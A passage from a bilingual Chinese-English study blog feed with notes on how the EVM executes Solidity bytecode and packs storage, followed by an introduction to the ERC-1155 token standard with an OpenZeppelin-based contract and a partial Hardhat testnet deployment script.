<p><code>0x1</code>在汇编代码中实际上是<code>push(0x1)</code>. 该指令将数字 1 压入堆栈。</p>
<h2 id="Simulating-The-EVM">Simulating The EVM:</h2>
<p>The EVM is a stack machine.<br />
Instructions指令 might use values on the stack as arguments, and push values onto the stack as results. Let’s consider the operation <code>add</code>.</p>
<p>栈里有两个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1 2]</span><br></pre></td></tr></table></figure>
<p>When the EVM sees add, it adds the top 2 items together, and pushes the answer back onto the stack, resulting in:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[3]</span><br></pre></td></tr></table></figure>
<h3 id="符号表示：">符号表示：</h3>
<p>In what follows, we’ll notate the <code>stack</code> with <code>[]</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// The empty stack</span><br><span class="line">stack: []</span><br><span class="line">// Stack with three items. The top item is 3. The bottom item is 1.</span><br><span class="line">stack: [3 2 1]</span><br></pre></td></tr></table></figure>
<p>And notate the contract <code>storage</code> with <code>&#123;&#125;</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Nothing in storage.</span><br><span class="line">store: &#123;&#125;</span><br><span class="line">// The value 0x1 is stored at the position 0x0.</span><br><span class="line">store: &#123; 0x0 =&gt; 0x1 &#125;</span><br></pre></td></tr></table></figure>
<h3 id="模拟：">模拟：</h3>
<p>Let’s now look at some real bytecode. We’ll simulate the bytecode sequence <code>6001600081905550</code>(a=1) as EVM would, and print out the machine state after each instruction:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 60 01: pushes 1 onto stack</span><br><span class="line">0x1</span><br><span class="line">  stack: [0x1]</span><br><span class="line">// 60 00: pushes 0 onto stack</span><br><span class="line">0x0</span><br><span class="line">  stack: [0x0 0x1]</span><br><span class="line">// 81: duplicate the second item on the stack</span><br><span class="line">dup2</span><br><span class="line">  stack: [0x1 0x0 0x1]</span><br><span class="line">// 90: swap the top two items</span><br><span class="line">swap1</span><br><span class="line">  stack: [0x0 0x1 0x1]</span><br><span class="line">// 55: store the value 0x1 at position 0x0</span><br><span class="line">// This instruction consumes消费 the top 2 items</span><br><span class="line">sstore</span><br><span class="line">  stack: [0x1]</span><br><span class="line">  store: &#123; 0x0 =&gt; 0x1 &#125;</span><br><span class="line">// 50: pop (throw away the top item)</span><br><span class="line">pop</span><br><span class="line">  stack: []</span><br><span class="line">  store: &#123; 0x0 =&gt; 0x1 &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220705214842.png" alt="20220705214842" /></p>
<p>The end. The stack is empty, and there’s one item in storage.</p>
<p>What’s worth noting is that Solidity had decided to store the state variable <code>uint256 a</code> at the position <code>0x0</code>.<br />
It’s perfectly possible for other languages to choose to store the state variable elsewhere.</p>
<h3 id="等价表示：">等价表示：</h3>
<p>In pseudocode, what the EVM does for <code>6001600081905550</code> is essentially:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// a = 1</span><br><span class="line">sstore(0x0, 0x1)</span><br></pre></td></tr></table></figure>
<p>其中,<code>dup2</code>, <code>swap1</code>, <code>pop</code>是多余的，汇编代码可以更简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1</span><br><span class="line">0x0</span><br><span class="line">sstore</span><br></pre></td></tr></table></figure>
<p>You could try to simulate the above 3 instructions, and satisfy yourself that they indeed result in the same machine state:</p>
<blockquote>
<p>怎么自己模拟指令呢。。。通过推演的方式？</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack: []</span><br><span class="line">store: &#123; 0x0 =&gt; 0x1 &#125;</span><br></pre></td></tr></table></figure>
<h1>Two Storage Variables:</h1>
<p>add one extra storage variable</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// c2.sol</span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.11</span>;</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint256 a;</span><br><span class="line">    uint256 b;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params"></span>) &#123;</span><br><span class="line">      a = <span class="number">1</span>;</span><br><span class="line">      b = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile, focusing on <code>tag_2</code>:</p>
<p>继续自己编译一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ solc --bin --asm c2.sol</span><br><span class="line"></span><br><span class="line">======= c2.sol:C =======</span><br><span class="line">EVM assembly:</span><br><span class="line">    /* &quot;c2.sol&quot;:36:136  contract C &#123;... */</span><br><span class="line">  mstore(0x40, 0x60)</span><br><span class="line">    /* &quot;c2.sol&quot;:84:134  function C() &#123;... */</span><br><span class="line">  jumpi(tag_1, iszero(callvalue))</span><br><span class="line">  0x0</span><br><span class="line">  dup1</span><br><span class="line">  revert</span><br><span class="line">tag_1:</span><br><span class="line">tag_2:</span><br><span class="line">    /* &quot;c2.sol&quot;:111:112  1 */</span><br><span class="line">  0x1</span><br><span class="line">    /* &quot;c2.sol&quot;:107:108  a */</span><br><span class="line">  0x0</span><br><span class="line">    /* &quot;c2.sol&quot;:107:112  a = 1 */</span><br><span class="line">  dup2</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">  pop</span><br><span class="line">    /* &quot;c2.sol&quot;:126:127  2 */</span><br><span class="line">  0x2</span><br><span class="line">    /* &quot;c2.sol&quot;:122:123  b */</span><br><span class="line">  0x1</span><br><span class="line">    /* &quot;c2.sol&quot;:122:127  b = 2 */</span><br><span class="line">  dup2</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">  pop</span><br><span class="line">    /* &quot;c2.sol&quot;:84:134  function C() &#123;... */</span><br><span class="line">tag_3:</span><br><span class="line">    /* &quot;c2.sol&quot;:36:136  contract C &#123;... */</span><br><span class="line">tag_4:</span><br><span class="line">  dataSize(sub_0)</span><br><span class="line">  dup1</span><br><span class="line">  dataOffset(sub_0)</span><br><span class="line">  0x0</span><br><span class="line">  codecopy</span><br><span class="line">  0x0</span><br><span class="line">  return</span><br><span class="line">stop</span><br><span class="line"></span><br><span class="line">sub_0: assembly &#123;</span><br><span class="line">        /* &quot;c2.sol&quot;:36:136  contract C &#123;... */</span><br><span class="line">      mstore(0x40, 0x60)</span><br><span class="line">    tag_1:</span><br><span class="line">      0x0</span><br><span class="line">      dup1</span><br><span class="line">      revert</span><br><span class="line"></span><br><span class="line">    auxdata: 0xa165627a7a7230582070e0c9efb38b3859709be0dc598f0f59277f9499ee8c60ab2e0043222726f9a60029</span><br><span class="line">&#125;</span><br><span class="line">Binary:</span><br><span class="line">60606040523415600e57600080fd5b5b600160008190555060026001819055505b5b603680602e6000396000f30060606040525b600080fd00a165627a7a7230582070e0c9efb38b3859709be0dc598f0f59277f9499ee8c60ab2e0043222726f9a60029</span><br></pre></td></tr></table></figure>
<p>The assembly in pseudocode伪代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// a = 1</span><br><span class="line">sstore(0x0, 0x1)</span><br><span class="line">// b = 2</span><br><span class="line">sstore(0x1, 0x2)</span><br></pre></td></tr></table></figure>
<p>What we learn here is that the two storage variables are positioned one after the other, with <code>a</code> in position <code>0x0</code> and <code>b</code> in position <code>0x1</code>.</p>
<h1>Storage Packing:</h1>
<p><strong>Each slot storage can store 32 bytes. It’d be wasteful to use all 32 bytes if a variable only needs 16 bytes.<br />
Solidity optimizes for storage efficiency by packing two smaller data types into one storage slot if possible.</strong></p>
<p>Let’s change <code>a</code> and <code>b</code> so they are only 16 bytes each:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint128 a;</span><br><span class="line">    uint128 b;</span><br><span class="line">    function C() &#123;</span><br><span class="line">      a = 1;</span><br><span class="line">      b = 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ solc --bin --asm c3.sol</span><br><span class="line"></span><br><span class="line">======= c3.sol:C =======</span><br><span class="line">EVM assembly:</span><br><span class="line">    /* &quot;c3.sol&quot;:26:126  contract C &#123;... */</span><br><span class="line">  mstore(0x40, 0x60)</span><br><span class="line">    /* &quot;c3.sol&quot;:74:124  function C() &#123;... */</span><br><span class="line">  jumpi(tag_1, iszero(callvalue))</span><br><span class="line">  0x0</span><br><span class="line">  dup1</span><br><span class="line">  revert</span><br><span class="line">tag_1:</span><br><span class="line">tag_2:</span><br><span class="line">    /* &quot;c3.sol&quot;:101:102  1 */</span><br><span class="line">  0x1</span><br><span class="line">    /* &quot;c3.sol&quot;:97:98  a */</span><br><span class="line">  0x0</span><br><span class="line">  dup1</span><br><span class="line">    /* &quot;c3.sol&quot;:97:102  a = 1 */</span><br><span class="line">  0x100</span><br><span class="line">  exp</span><br><span class="line">  dup2</span><br><span class="line">  sload</span><br><span class="line">  dup2</span><br><span class="line">  0xffffffffffffffffffffffffffffffff</span><br><span class="line">  mul</span><br><span class="line">  not</span><br><span class="line">  and</span><br><span class="line">  swap1</span><br><span class="line">  dup4</span><br><span class="line">  0xffffffffffffffffffffffffffffffff</span><br><span class="line">  and</span><br><span class="line">  mul</span><br><span class="line">  or</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">  pop</span><br><span class="line">    /* &quot;c3.sol&quot;:116:117  2 */</span><br><span class="line">  0x2</span><br><span class="line">    /* &quot;c3.sol&quot;:112:113  b */</span><br><span class="line">  0x0</span><br><span class="line">  0x10</span><br><span class="line">    /* &quot;c3.sol&quot;:112:117  b = 2 */</span><br><span class="line">  0x100</span><br><span class="line">  exp</span><br><span class="line">  dup2</span><br><span class="line">  sload</span><br><span class="line">  dup2</span><br><span class="line">  0xffffffffffffffffffffffffffffffff</span><br><span class="line">  mul</span><br><span class="line">  not</span><br><span class="line">  and</span><br><span class="line">  swap1</span><br><span class="line">  dup4</span><br><span class="line">  0xffffffffffffffffffffffffffffffff</span><br><span class="line">  and</span><br><span class="line">  mul</span><br><span class="line">  or</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">  pop</span><br><span class="line">    /* &quot;c3.sol&quot;:74:124  function C() &#123;... */</span><br><span class="line">tag_3:</span><br><span class="line">    /* &quot;c3.sol&quot;:26:126  contract C &#123;... */</span><br><span class="line">tag_4:</span><br><span class="line">  dataSize(sub_0)</span><br><span class="line">  dup1</span><br><span class="line">  dataOffset(sub_0)</span><br><span class="line">  0x0</span><br><span class="line">  codecopy</span><br><span class="line">  0x0</span><br><span class="line">  return</span><br><span class="line">stop</span><br><span class="line"></span><br><span class="line">sub_0: assembly &#123;</span><br><span class="line">        /* &quot;c3.sol&quot;:26:126  contract C &#123;... */</span><br><span class="line">      mstore(0x40, 0x60)</span><br><span class="line">    tag_1:</span><br><span class="line">      0x0</span><br><span class="line">      dup1</span><br><span class="line">      revert</span><br><span class="line"></span><br><span class="line">    auxdata: 0xa165627a7a723058205c61ec381fa987a743b915be31883e35d32dccd6b264c9408a6563273d683e5d0029</span><br><span class="line">&#125;</span><br><span class="line">Binary:</span><br><span class="line">60606040523415600e57600080fd5b5b60016000806101000a8154816fffffffffffffffffffffffffffffffff02191690836fffffffffffffffffffffffffffffffff1602179055506002600060106101000a8154816fffffffffffffffffffffffffffffffff02191690836fffffffffffffffffffffffffffffffff1602179055505b5b60368060916000396000f30060606040525b600080fd00a165627a7a723058205c61ec381fa987a743b915be31883e35d32dccd6b264c9408a6563273d683e5d0029</span><br></pre></td></tr></table></figure>
<p>The above assembly code packs these two variables together in one storage position (<code>0x0</code>), like this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[         b         ][         a         ]</span><br><span class="line">[16 bytes / 128 bits][16 bytes / 128 bits]</span><br></pre></td></tr></table></figure>
<p>The reason to pack is because the most expensive operations by far are <strong>storage usage</strong>:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>sstore</code> costs 20000 gas for first write to a new position.</p>
</li>
<li class="lvl-2">
<p><code>sstore</code> costs 5000 gas for subsequent writes to an existing position.</p>
</li>
<li class="lvl-2">
<p><code>sload</code> costs 500 gas.</p>
</li>
<li class="lvl-2">
<p>Most instructions costs 3~10 gases.</p>
</li>
</ul>
<p><strong>By using the same storage position, Solidity pays 5000 for the second store variable instead of 20000, saving us 15000 in gas.</strong></p>
<h2 id="More-Optimization">More Optimization:</h2>
<p>Instead of storing <code>a</code> and <code>b</code> with two separate <code>sstore</code> instructions, it should be possible to pack the two 128 bits numbers together in memory, then store them using just one <code>sstore</code>, saving an additional 5000 gas.</p>
<p>You can ask Solidity to make this optimization by turning on the optimize flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ solc --bin --asm --optimize c3.sol</span><br></pre></td></tr></table></figure>
<p>Which produces assembly code that uses just one <code>sload</code> and one <code>sstore</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tag_2:</span><br><span class="line">    /* &quot;c3.sol&quot;:97:98  a */</span><br><span class="line">  0x0</span><br><span class="line">    /* &quot;c3.sol&quot;:97:102  a = 1 */</span><br><span class="line">  dup1</span><br><span class="line">  sload</span><br><span class="line">    /* &quot;c3.sol&quot;:112:117  b = 2 */</span><br><span class="line">  0x200000000000000000000000000000000</span><br><span class="line">  not(sub(exp(0x2, 0x80), 0x1))</span><br><span class="line">    /* &quot;c3.sol&quot;:97:102  a = 1 */</span><br><span class="line">  swap1</span><br><span class="line">  swap2</span><br><span class="line">  and</span><br><span class="line">    /* &quot;c3.sol&quot;:101:102  1 */</span><br><span class="line">  0x1</span><br><span class="line">    /* &quot;c3.sol&quot;:97:102  a = 1 */</span><br><span class="line">  or</span><br><span class="line">  sub(exp(0x2, 0x80), 0x1)</span><br><span class="line">    /* &quot;c3.sol&quot;:112:117  b = 2 */</span><br><span class="line">  and</span><br><span class="line">  or</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">    /* &quot;c3.sol&quot;:74:124  function C() &#123;... */</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line">Binary:</span><br><span class="line">60606040523415600e57600080fd5b5b600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a03161790555b5b603680604f6000396000f30060606040525b600080fd00a165627a7a7230582037e97488c5ea276798eb3a3e48ab39f5d02bb4e2936813cde904a02bbd43abb10029</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>加了优化参数，少了不少汇编代码</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220706014839.png" alt="20220706014839" /></p>
<p>The bytecode is:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055</span><br></pre></td></tr></table></figure>
<p>And formatting the bytecode to one instruction per line:</p>
<blockquote>
<p>TODO:这步操作可以多熟悉熟悉，或者看看有没其他工具可以帮助看汇编代码的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// push 0x0</span><br><span class="line">60 00</span><br><span class="line">// dup1</span><br><span class="line">80</span><br><span class="line">// sload</span><br><span class="line">54</span><br><span class="line">// push17 push the the next 17 bytes as a 32 bytes number</span><br><span class="line">70 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">/* not(sub(exp(0x2, 0x80), 0x1)) */</span><br><span class="line">// push 0x1</span><br><span class="line">60 01</span><br><span class="line">// push 0x80 (32)</span><br><span class="line">60 80</span><br><span class="line">// push 0x80 (2)</span><br><span class="line">60 02</span><br><span class="line">// exp</span><br><span class="line">0a</span><br><span class="line">// sub</span><br><span class="line">03</span><br><span class="line">// not</span><br><span class="line">19</span><br><span class="line">// swap1</span><br><span class="line">90</span><br><span class="line">// swap2</span><br><span class="line">91</span><br><span class="line">// and</span><br><span class="line">16</span><br><span class="line">// push 0x1</span><br><span class="line">60 01</span><br><span class="line">// or</span><br><span class="line">17</span><br><span class="line">/* sub(exp(0x2, 0x80), 0x1) */</span><br><span class="line">// push 0x1</span><br><span class="line">60 01</span><br><span class="line">// push 0x80</span><br><span class="line">60 80</span><br><span class="line">// push 0x02</span><br><span class="line">60 02</span><br><span class="line">// exp</span><br><span class="line">0a</span><br><span class="line">// sub</span><br><span class="line">03</span><br><span class="line">// and</span><br><span class="line">16</span><br><span class="line">// or</span><br><span class="line">17</span><br><span class="line">// swap1</span><br><span class="line">90</span><br><span class="line">// sstore</span><br><span class="line">55</span><br></pre></td></tr></table></figure>
<p>There are four magic values used in the assembly code:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>0x1 (16 bytes), using lower 16 bytes</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Represented as 0x01 in bytecode</span><br><span class="line">16:32 0x00000000000000000000000000000000</span><br><span class="line">00:16 0x00000000000000000000000000000001</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>0x2 (16 bytes), using higher 16bytes</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Represented as 0x200000000000000000000000000000000 in bytecode</span><br><span class="line">16:32 0x00000000000000000000000000000002</span><br><span class="line">00:16 0x00000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>not(sub(exp(0x2, 0x80), 0x1))</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Bitmask for the upper 16 bytes</span><br><span class="line">16:32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">00:16 0x00000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>sub(exp(0x2, 0x80), 0x1)</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Bitmask for the lower 16 bytes</span><br><span class="line">16:32 0x00000000000000000000000000000000 </span><br><span class="line">00:16 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br></pre></td></tr></table></figure>
<p>The code does some bits-shuffling移位 with these values to arrive at the desired result:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16:32 0x00000000000000000000000000000002 </span><br><span class="line">00:16 0x00000000000000000000000000000001</span><br></pre></td></tr></table></figure>
<p>Finally, this 32bytes value is stored at position <code>0x0</code>.</p>
<blockquote>
<p>TODO:这一小节需要回看。。。</p>
</blockquote>
<h2 id="Gas-Usage">Gas Usage:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">600080547002000000000000000000000000000000006001608060020a03199091166001176001608060020a0316179055</span><br></pre></td></tr></table></figure>
<p>是上面<code>tag2</code>部分的Binary数据,<code>tag2</code>里面的操作就是赋值<code>uint128 a= 1</code>，<code>uint128 b=2</code>。</p>
<h1>Summary：</h1>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/52078476">翻译：深入理解EVM（1）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.arcblock.io/blog/zh/post/2018/12/08/evm-part-1">深入探索EVM : 编译和部署智能合约</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-ERC1155协议</title>
    <url>/2023/20767.html</url>
    <content><![CDATA[<h1>简介:</h1>
<p>ERC-1155是ERC-20和ERC-721的升级规范，用于多种代币管理的合约标准接口。 单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合,即可以使用一个智能合约同时代表多个代币。</p>
<h1>功能和特点:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>批量转移：一次调用即可转移多个资产。</p>
</li>
<li class="lvl-2">
<p>批次余额：一次调用即可获取多个资产的余额。</p>
</li>
<li class="lvl-2">
<p>批量批准：批准所有令牌到一个地址。</p>
</li>
<li class="lvl-2">
<p>EIP-165支持：声明支持的接口。</p>
</li>
<li class="lvl-2">
<p>钩子接口：提供代币接受钩子接口。</p>
</li>
<li class="lvl-2">
<p>NFT支持：如果供应量仅为1，则将其视为NFT。</p>
</li>
<li class="lvl-2">
<p>安全转移规则：安全转移的规则集</p>
</li>
</ul>
<p><code>ERC1155的显着特点是它有一个额外的id参数，作为多种代币的唯一标识符。也就是说，多了一个key-value,多了一个键值对，映射着TokenId-&gt;Token。</code></p>
<h1>实现:</h1>
<ol>
<li class="lvl-3">
<p>同质化代币,类似<code>ERC20</code>,一个合约中包含一种或多种ERC20代币，<a href="https://cloud.tencent.com/developer/article/1192545">例子</a></p>
</li>
<li class="lvl-3">
<p>非同质化代币,类似<code>ERC721</code>，一个合约中包含一种或多种ERC721代币，<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/40_ERC1155/readme.md">例子</a></p>
</li>
<li class="lvl-3">
<p>半同质化代币,代币含<code>ERC20</code>+<code>ERC721</code>的属性，ERC721代币同一个ID有多个数量，<a href="https://polygonscan.com/address/0xa9e893cc12026a2f6bd826fdb295eac9c18a7e88#code">例子</a></p>
</li>
<li class="lvl-3">
<p>同质化代币+非同质化代币,一个合约中包含<code>ERC20</code>、<code>ERC721</code>两种类型的代币，<a href="https://docs.openzeppelin.com/contracts/4.x/erc1155">例子</a></p>
</li>
</ol>
<h1>ERC1155部署在opensea上:</h1>
<p>通过ERC1155协议，模仿实现一个半同质化代币，一个项目有4种NFT会员卡，每个NFT会员卡有多个数量。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20230111143048.png" alt="20230111143048" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20230111143120.png" alt="20230111143120" /><br />
<a href="https://github.com/jerrychan807/my-awesome-solidity/tree/main/erc1155">测试的合约源码 github</a></p>
<h2 id="合约源码-2">合约源码:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MyToken.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC1155/ERC1155.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/Ownable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC1155/extensions/ERC1155Supply.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Strings.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MyToken</span> is <span class="title class_">ERC1155</span>, <span class="title class_">Ownable</span>, <span class="title class_">ERC1155Supply</span> &#123;</span><br><span class="line">    using <span class="title class_">Strings</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC1155</span>(<span class="string">&quot;&quot;</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @dev End token Id =&gt; URI that overrides `baseURI + tokenId` convention.</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint256</span> =&gt;</span> string) public _baseURI;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setBaseURI</span>(<span class="params">uint256 _tokenId, string memory newuri</span>) public onlyOwner &#123;</span><br><span class="line">        _baseURI[_tokenId] = newuri;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @dev Returns the URI for a given tokenId.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">uri</span>(<span class="params">uint256 _tokenId</span>) public view override returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">string</span>(abi.<span class="title function_">encodePacked</span>(_baseURI[_tokenId], _tokenId.<span class="title function_">toString</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address account, uint256 id, uint256 amount, bytes memory data</span>)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(account, id, amount, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mintBatch</span>(<span class="params">address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data</span>)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">_mintBatch</span>(to, ids, amounts, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The following functions are overrides required by Solidity.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_beforeTokenTransfer</span>(<span class="params">address operator, address <span class="keyword">from</span>, address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data</span>)</span><br><span class="line">        internal</span><br><span class="line">        <span class="title function_">override</span>(<span class="params">ERC1155, ERC1155Supply</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">_beforeTokenTransfer</span>(operator, <span class="keyword">from</span>, to, ids, amounts, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>继承了ERC1155Supply,后续可查询多种Token的totalSupply</p>
</li>
</ul>
<h2 id="部署脚本">部署脚本:</h2>
<p>合约部署在测试网上，<a href="https://goerli.etherscan.io/address/0x06983Ca838F76407436a36C1EB8FE5C4b44caFd0#code">https://goerli.etherscan.io/address/0x06983Ca838F76407436a36C1EB8FE5C4b44caFd0#code</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// scripts/1.set_uri.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;ethers, run, network&#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">TokenFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;MyToken&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Deploying Token...&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Token</span> = <span class="keyword">await</span> <span class="title class_">TokenFactory</span>.<span class="title function_">deploy</span>()</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">deployed</span>()</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Token Contract deployed at:&quot;</span>, <span class="title class_">Token</span>.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">setBaseURI</span>(<span class="number">0</span>, <span class="string">&quot;ipfs://QmavJyMNJiAz9hXTmZrEuFMi8yrpiNjUbFujHE57Z6avc3/&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> baseUri = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">uri</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;baseUri:&quot;</span>, baseUri.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">setBaseURI</span>(<span class="number">1</span>, <span class="string">&quot;ipfs://QmTwC69n8hPzWYw1wHXT8Dc8h7PnjtAfzLFHPLz423DadA/&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> baseUri1 = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">uri</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;baseUri1:&quot;</span>, baseUri1.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">setBaseURI</span>(<span class="number">2</span>, <span class="string">&quot;ipfs://QmTcwvsf1XXi5kKkBbk7iNX8svZD6iE4JE6NXioFiRTKbD/&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> baseUri2 = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">uri</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;baseUri2:&quot;</span>, baseUri2.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">setBaseURI</span>(<span class="number">3</span>, <span class="string">&quot;ipfs://QmduXsTYa8NQ4xfFwXbLLpkkznwhwS9b1MMa25SENcvcRC/&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> baseUri3 = <span class="keyword">await</span> <span class="title 